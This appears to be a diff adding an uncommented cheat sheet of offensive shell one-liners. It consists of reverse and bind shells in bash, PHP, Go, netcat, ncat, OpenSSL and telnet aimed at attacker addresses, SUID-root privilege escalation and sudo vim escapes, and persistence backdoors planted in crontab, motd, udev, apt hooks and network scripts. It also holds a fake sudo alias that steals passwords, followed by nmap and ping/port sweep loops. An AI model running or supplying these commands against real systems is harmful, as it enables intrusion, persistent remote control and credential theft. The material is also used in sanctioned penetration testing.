@@ -1,0 +1,69 @@
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+nc -u -lvp 4242
+php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+nc -e /bin/sh 10.0.0.1 4242
+nc -e /bin/bash 10.0.0.1 4242
+nc -c bash 10.0.0.1 4242
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+ncat 10.0.0.1 4242 -e /bin/bash
+ncat --udp 10.0.0.1 4242 -e /bin/bash
+openssl rand -hex 48
+export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept 10.10.14.9:4444
+export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect 10.10.14.9:4444 > $PIPE; rm $PIPE
+nc -lvp 8080
+nc -lvp 8081
+telnet 10.10.14.9 8080 | /bin/sh | telnet 10.10.14.9 8081
+tmux
+nc -lnvp 4242
+ps aux # | grep -i nc | grep -vi grep
+socat file:`tty`,raw,echo=0 tcp-listen:12345
+stty raw -echo; stty size && rcat l -ie "/usr/bin/script -qc /bin/bash /dev/null" 6969 && reset
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
+gcc -o /tmp/suid /tmp/suid.c
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+sudo -l
+sudo vim -c '!sh'
+sudo -u root vim -c '!sh'
+ncat --udp -lvp 4242
+ncat --sctp -lvp 4242
+ncat --tcp -lvp 4242
+(crontab -l ; echo "@reboot sleep 200 && ncat 10.10.10.10 4242 -e /bin/bash")|crontab 2> /dev/null
+TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
+alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
+cat /tmp/$TMPNAME2 >> ~/.bashrc
+cat /tmp/$TMPNAME2 >> ~/.zshrc
+rm /tmp/$TMPNAME2
+RSHELL="ncat $LMTHD 10.10.14.9 4444 -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
+sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
+echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
+echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
+echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
+sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4
+sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv
+nmap -sV -sC -oA ~/nmap-initial 192.168.1.1
+nmap -A -T4 scanme.nmap.org
+nmap -p- -sV -oX a.xml 10.10.14.9; searchsploit --nmap a.xml
+nmap -sV 10.10.14.9 -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
+nmap --script 'http-enum' -v web.xxxx.com -p80 -oN http-enum.nmap
+nmap --script smb-enum-users.nse -p 445 10.10.14.9
+for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.$i is UP"; fi ; done
+for i in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.18 $i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.18 has port $i open"; fi ; done
+for i in `seq 1 255`; do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "192.168.1.$i is UP:"; for j in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1; if [ $? -eq 0 ]; then echo "\t192.168.1.$i has port $j open"; fi ; done ; fi ; done
+ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1;
+echo "192.168.1.$i is UP:";
+nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1;
+echo "\t192.168.1.$i has port $j open";
